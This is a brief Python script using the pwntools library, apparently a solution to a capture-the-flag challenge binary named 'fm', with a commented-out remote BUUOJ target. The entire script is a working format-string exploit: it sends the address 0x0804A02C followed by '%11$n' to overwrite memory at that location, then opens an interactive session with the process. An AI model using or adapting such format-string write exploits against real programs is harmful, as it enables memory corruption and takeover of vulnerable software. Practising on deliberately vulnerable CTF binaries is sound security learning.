from pwn import *

proc_name = './fm'

p = process(proc_name)
#p = remote('node3.buuoj.cn',22222)

x_addr = 0x0804A02C

payload = p32(x_addr) + b'%11$n'

p.sendline(payload)

p.interactive()
